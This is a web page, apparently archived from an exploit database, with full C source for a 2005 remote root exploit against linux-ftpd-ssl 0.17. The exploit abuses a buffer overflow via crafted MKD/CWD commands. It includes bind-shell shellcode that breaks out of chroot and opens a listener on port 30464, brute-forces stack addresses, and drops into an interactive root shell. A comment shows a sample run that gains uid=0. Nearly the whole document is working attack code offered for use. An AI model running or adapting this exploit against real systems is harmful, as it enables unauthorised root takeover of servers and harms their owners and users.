<html><head><title>linux-ftpd-ssl 0.17 (MKD/CWD) Remote Root Exploit</title></head><pre>/*Oct2005 VER2*/
/**********************************************************/
/** lnxFTPDssl_warez.c                                   **/
/** linux-ftpd-ssl 0.17 remote r00t exploit by kcope     **/
/** for all of those who installed the ssl ready version **/
/** of linux-ftpd to be more &quot;secure&quot;                    **/
/**                                                      **/
/** be aware of the buffer overflows,                    **/
/** the code is strong cryto                             **/
/**********************************************************/
/** thanx blackzero,revoguard,wY!,net_spy                **/
/** Confidential. Keep Private!                          **/
/**********************************************************/
/**
C:\Dokumente und Einstellungen\Administrator\Desktop&gt;telnet 192.168.2.9 21
220 localhost.localdomain FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
AUTH SSL
234 AUTH SSL OK.
;PpPpPPpPPPpPPPPpPppPPPPPpPpPPPpPPpPpPPpPPPpPPPPpPppPPPPPpPpPPPpP
C:\Dokumente und Einstellungen\Administrator\Desktop&gt;lnxFTPDssl_warez.exe 192.168.2.9 kcope password
lnxFTPDssl_warez.c
linux-ftpd-ssl 0.17 remote r00t exploit by kcope

connecting to 192.168.2.9:21... ok.
OK - STARTING ATTACK
+++ USING STACK ADDRESS 0xbfffcc03 +++
+++ USING STACK ADDRESS 0xbfffcc13 +++
+++ USING STACK ADDRESS 0xbfffcc23 +++
+++ USING STACK ADDRESS 0xbfffcc33 +++
+++ USING STACK ADDRESS 0xbfffcc43 +++
+++ USING STACK ADDRESS 0xbfffcc53 +++
+++ USING STACK ADDRESS 0xbfffcc63 +++
+++ USING STACK ADDRESS 0xbfffcc73 +++
+++ USING STACK ADDRESS 0xbfffcc83 +++
+++ USING STACK ADDRESS 0xbfffcc93 +++
+++ USING STACK ADDRESS 0xbfffcca3 +++
+++ USING STACK ADDRESS 0xbfffccb3 +++
+++ USING STACK ADDRESS 0xbfffccc3 +++
+++ USING STACK ADDRESS 0xbfffccd3 +++
+++ USING STACK ADDRESS 0xbfffcce3 +++
+++ USING STACK ADDRESS 0xbfffccf3 +++
+++ USING STACK ADDRESS 0xbfffcd03 +++
+++ USING STACK ADDRESS 0xbfffcd13 +++
+++ USING STACK ADDRESS 0xbfffcd23 +++
+++ USING STACK ADDRESS 0xbfffcd33 +++
+++ USING STACK ADDRESS 0xbfffcd43 +++
+++ USING STACK ADDRESS 0xbfffcd53 +++
+++ USING STACK ADDRESS 0xbfffcd63 +++
+++ USING STACK ADDRESS 0xbfffcd73 +++
+++ USING STACK ADDRESS 0xbfffcd83 +++
+++ USING STACK ADDRESS 0xbfffcd93 +++
+++ USING STACK ADDRESS 0xbfffcda3 +++
+++ USING STACK ADDRESS 0xbfffcdb3 +++
+++ USING STACK ADDRESS 0xbfffcdc3 +++
+++ USING STACK ADDRESS 0xbfffcdd3 +++
+++ USING STACK ADDRESS 0xbfffcde3 +++
+++ USING STACK ADDRESS 0xbfffcdf3 +++
+++ USING STACK ADDRESS 0xbfffce03 +++
+++ USING STACK ADDRESS 0xbfffce13 +++
+++ USING STACK ADDRESS 0xbfffce23 +++
+++ USING STACK ADDRESS 0xbfffce33 +++
+++ USING STACK ADDRESS 0xbfffce43 +++
+++ USING STACK ADDRESS 0xbfffce53 +++
+++ USING STACK ADDRESS 0xbfffce63 +++
+++ USING STACK ADDRESS 0xbfffce73 +++
+++ USING STACK ADDRESS 0xbfffce83 +++
+++ USING STACK ADDRESS 0xbfffce93 +++
+++ USING STACK ADDRESS 0xbfffcea3 +++
+++ USING STACK ADDRESS 0xbfffceb3 +++
+++ USING STACK ADDRESS 0xbfffcec3 +++

Let's get ready to rumble!
id
uid=0(root) gid=0(root) egid=1000(kcope) groups=1000(kcope),20(dialout),24(cdrom
),25(floppy),29(audio),44(video),46(plugdev)
uname -a
Linux debian 2.4.27-2-386 #1 Mon May 16 16:47:51 JST 2005 i686 GNU/Linux

**/
// Tested on    Linux 2.4.18-14 Redhat 8.0
//              Linux 2.2.20-idepci Debian GNU 3.0
//              Linux 2.4.27-2-386 Debian GNU 3.1
// CHECK VER3 FOR MORE SUPPORT!!!
// ***KEEP IT ULTRA PRIV8***

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;

#define BUF_SIZ 4096
#define PORT 21
#define BINDPORT 30464
#define STACK_START 0xbfffcc03
#define STACK_END 0xbffff4f0

/*my shellcode*/
/*setreuid,chroot break,
bind to port 30464, 0xff is double*/
unsigned char lnx_bind[] =
&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\xEB\x70\x31\xC0\x31\xDB\x31\xC9&quot;
&quot;\xB0\x46\xCD\x80\x5E\x90\xB8\xBE&quot;
&quot;\xff\xff\xff\xff\xff\xff\xF7\xD0&quot;
&quot;\x89\x06\xB0\x27\x8D\x1E\xFE\xC5&quot;
&quot;\xB1\xED\xCD\x80\x31\xC0\x8D\x1E&quot;
&quot;\xB0\x3D\xCD\x80\x66\xB9\xff\xff&quot;
&quot;\x03\xBB\xD2\xD1\xD0\xff\xff\xF7&quot;
&quot;\xDB\x89\x1E\x8D\x1E\xB0\x0C\xCD&quot;
&quot;\x80\xE2\xEF\xB8\xD1\xff\xff\xff&quot;
&quot;\xff\xff\xff\xF7\xD0\x89\x06\xB0&quot;
&quot;\x3D\x8D\x1E\xCD\x80\x31\xC0\x31&quot;
&quot;\xDB\x89\xF1\xB0\x02\x89\x06\xB0&quot;
&quot;\x01\x89\x46\x04\xB0\x06\x89\x46&quot;
&quot;\x08\xB0\x66\x43\xCD\x80\x89\xF1&quot;
&quot;\x89\x06\xB0\x02\x66\x89\x46\x0C&quot;
&quot;\xEB\x04\xEB\x74\xEB\x77\xB0\x77&quot;
&quot;\x66\x89\x46\x0E\x8D\x46\x0C\x89&quot;
&quot;\x46\x04\x31\xC0\x89\x46\x10\xB0&quot;
&quot;\x10\x89\x46\x08\xB0\x66\x43\xCD&quot;
&quot;\x80\xB0\x01\x89\x46\x04\xB0\x66&quot;
&quot;\xB3\x04\xCD\x80\x31\xC0\x89\x46&quot;
&quot;\x04\x89\x46\x08\xB0\x66\xB3\x05&quot;
&quot;\xCD\x80\x88\xC3\xB0\x3F\x31\xC9&quot;
&quot;\xCD\x80\xB0\x3F\xB1\x01\xCD\x80&quot;
&quot;\xB0\x3F\xB1\x02\xCD\x80\xB8\xD0&quot;
&quot;\x9D\x96\x91\xF7\xD0\x89\x06\xB8&quot;
&quot;\xD0\x8C\x97\xD0\xF7\xD0\x89\x46&quot;
&quot;\x04\x31\xC0\x88\x46\x07\x89\x76&quot;
&quot;\x08\x89\x46\x0C\xB0\x0B\x89\xF3&quot;
&quot;\x8D\x4E\x08\x8D\x56\x0C\xCD\x80&quot;
&quot;\xE8\x15\xff\xff\xff\xff\xff\xff&quot;;

long ficken() {
       printf(&quot;lnxFTPDssl_warez.c\nlinux-ftpd-ssl 0.17 remote r00t exploit by kcope\n\n&quot;);
       return 0xc0debabe;
}

void usage(char **argv) {
       printf(&quot;Insufficient parameters given.\n&quot;);
       printf(&quot;Usage: %s &lt;remotehost&gt; &lt;user&gt; &lt;pass&gt; [writeable directory]\n&quot;, argv[0]);
       exit(0);
}

void _recv(int sock, char *buf) {
       int bytes=recv(sock, buf, BUFSIZ, 0);
       if (bytes &lt; 0) {
               perror(&quot;read() failed&quot;);
               exit(1);
       }
}

void attack(int sock, unsigned long ret, char *pad) {
       int i,k;
       char *x=(char*)malloc(1024);
       char *bufm=(char*)malloc(1024);
       char *bufc=(char*)malloc(1024);
       char *rbuf=(char*)malloc(BUFSIZ+10);
       char *nops=(char*)malloc(1024);
       unsigned char a,b,c,d;

       memset(nops,0,1024);
       memset(nops,0x90,255);
       memset(x,0,1024);
       for (i=0,k=0;i&lt;60;i++) {
               a=(ret &gt;&gt; 24) &amp; 0xff;
               b=(ret &gt;&gt; 16) &amp; 0xff;
               c=(ret &gt;&gt; 8) &amp; 0xff;
               d=(ret) &amp; 0xff;

               if (d==255) {
                       x[k]=d;
                       x[++k]=255;
               } else {
                       x[k]=d;
               }

               if (c==255) {
                       x[k+1]=c;
                       x[++k+1]=255;
               } else {
                       x[k+1]=c;
               }

               if (b==255) {
                       x[k+2]=b;
                       x[++k+2]=255;
               } else {
                       x[k+2]=b;
               }

               if (a==255) {
                       x[k+3]=a;
                       x[++k+3]=255;
               } else {
                       x[k+3]=a;
               }

               k+=4;
       }

       snprintf(bufm, 1000, &quot;MKD %s%s\r\n&quot;, pad, x); // 1x'A' redhat 8.0 / 2x'A' debian gnu 3.0 / 3x'A' debian gnu 3.1
       snprintf(bufc, 1000, &quot;CWD %s%s\r\n&quot;, pad, x);
       for (i=0; i&lt;11; i++) {
               send(sock, bufm, strlen(bufm), 0);
               recv(sock, rbuf, BUFSIZ, 0);
               send(sock, bufc, strlen(bufc), 0);
               recv(sock, rbuf, BUFSIZ, 0);
       }

       for (i=0; i&lt;2; i++) {
               snprintf(bufm, 1000, &quot;MKD %s\r\n&quot;, lnx_bind);
               snprintf(bufc, 1000, &quot;CWD %s\r\n&quot;, lnx_bind);
               send(sock, bufm, strlen(bufm), 0);
               recv(sock, rbuf, BUFSIZ, 0);
               send(sock, bufc, strlen(bufc), 0);
               recv(sock, rbuf, BUFSIZ, 0);

               snprintf(bufm, 1000, &quot;MKD %s\r\n&quot;, nops);
               snprintf(bufc, 1000, &quot;CWD %s\r\n&quot;, nops);
               send(sock, bufm, strlen(bufm), 0);
               recv(sock, rbuf, BUFSIZ, 0);
               send(sock, bufc, strlen(bufc), 0);
               recv(sock, rbuf, BUFSIZ, 0);
       }

       send(sock, &quot;XPWD\r\n&quot;, strlen(&quot;XPWD\r\n&quot;), 0);

       free(bufm);
       free(bufc);
       free(x);
       free(rbuf);
}

int do_remote_shell(int sockfd)
{
       while(1)
        {
           fd_set fds;
           FD_ZERO(&amp;fds);
           FD_SET(0,&amp;fds);
           FD_SET(sockfd,&amp;fds);
           if(select(FD_SETSIZE,&amp;fds,NULL,NULL,NULL))
           {
              int cnt;
              char buf[1024];
              if(FD_ISSET(0,&amp;fds))
              {
                 if((cnt=read(0,buf,1024))&lt;1)
                 {
                    if(errno==EWOULDBLOCK||errno==EAGAIN)
                      continue;
                    else
                      break;
                 }
                 write(sockfd,buf,cnt);
              }
              if(FD_ISSET(sockfd,&amp;fds))
              {
                 if((cnt=read(sockfd,buf,1024))&lt;1)
                 {
                      if(errno==EWOULDBLOCK||errno==EAGAIN)
                        continue;
                      else
                        break;
                 }
                 write(1,buf,cnt);
              }
           }
        }
}

int do_connect (char *remotehost, int port) {
       struct hostent *host;
       struct sockaddr_in addr;
       int s;

       if (!inet_aton(remotehost, &amp;addr.sin_addr))
       {
               host = gethostbyname(remotehost);
               if (!host)
               {
                       perror(&quot;gethostbyname() failed&quot;);
                       return -1;
               }
               addr.sin_addr = *(struct in_addr*)host-&gt;h_addr;
       }

       s = socket(PF_INET, SOCK_STREAM, 0);
       if (s == -1)
       {
               perror(&quot;socket() failed&quot;);
               return -1;
       }

       addr.sin_port = htons(port);
       addr.sin_family = AF_INET;

       if (connect(s, (struct sockaddr*)&amp;addr, sizeof(addr)) == -1)
       {
               if (port == PORT) perror(&quot;connect() failed&quot;);
               return -1;
       }

       return s;
}

void do_login(int s, char *buf, char *sendbuf, char *user, char *pass) {
       memset(buf, 0, sizeof(buf));
       memset(sendbuf, 0, sizeof(sendbuf));
       do {
               _recv(s, buf);
       } while (strstr(buf, &quot;220 &quot;) == NULL);
       snprintf(sendbuf, BUFSIZ, &quot;USER %s\r\n&quot;, user);
       send(s, sendbuf, strlen(sendbuf), 0);
       do {
               _recv(s, buf);
       } while (strstr(buf, &quot;331 &quot;) == NULL);

       snprintf(sendbuf, BUFSIZ, &quot;PASS %s\r\n&quot;, pass);
       send(s, sendbuf, strlen(sendbuf), 0);
       do {
       _recv(s, buf);
       } while (strstr(buf, &quot;230 &quot;) == NULL);
}

int main(int argc, char **argv) {
       char remotehost[255];
       char user[255];
       char pass[255];
       char pad[10];
       char *buf,*sendbuf;
       int stackaddr=STACK_START;
       int s,sr00t,i;

       ficken();
       if (argc &lt; 4)
               usage(argv);

       strncpy(remotehost, argv[1], sizeof(remotehost));
       remotehost[sizeof(remotehost)-1]=0;
       strncpy(user, argv[2], sizeof(user));
       user[sizeof(user)-1]=0;
       strncpy(pass, argv[3], sizeof(pass));
       pass[sizeof(pass)-1]=0;

       printf(&quot;connecting to %s:%d...&quot;, remotehost, PORT);
       fflush(stdout);

       s=do_connect(remotehost, PORT);

       puts(&quot; ok.&quot;);
       buf=(char*)malloc(BUFSIZ+10);
       sendbuf=(char*)malloc(BUFSIZ+10);
       do_login(s, buf, sendbuf, user, pass);

       if (strstr(buf, &quot;230&quot;)!=NULL) {
               printf(&quot;OK - STARTING ATTACK\n&quot;);
               i=0;
               while (stackaddr &lt;= STACK_END) {
                       printf(&quot;+++ USING STACK ADDRESS 0x%.08x +++\n&quot;, stackaddr);

                       sleep(1);

                       if (i==1) {
                               strcpy(pad, &quot;A&quot;);
                       }

                       if (i==2) {
                               strcpy(pad, &quot;AA&quot;);
                       }

                       if (i==3) {
                               strcpy(pad, &quot;AAA&quot;);
                               i=0;
                       }

                       attack(s, stackaddr, pad);
                       close(s);
                       s=do_connect(remotehost, PORT);
                       do_login(s, buf, sendbuf, user, pass);

                       if (argv[4] != NULL) {
                               snprintf(sendbuf, BUFSIZ, &quot;CWD %s\r\n&quot;, argv[4]);
                               send(s, sendbuf, strlen(sendbuf), 0);
                               recv(s, buf, BUFSIZ, 0);
                       }

                       if((sr00t=do_connect(remotehost, BINDPORT)) &gt; 0) {
                               /* XXX Remote r00t */
                               printf(&quot;\nLet's get ready to rumble!\n&quot;);
                               do_remote_shell(sr00t);
                               exit(0);
                       }

                       stackaddr+=16;
                       i++;
               }
       } else {
               printf(&quot;\nLogin incorrect\n&quot;);
               exit(1);
       }

       free(buf);
       free(sendbuf);
       return 0;
}

// milw0rm.com [2005-11-05]</pre></html>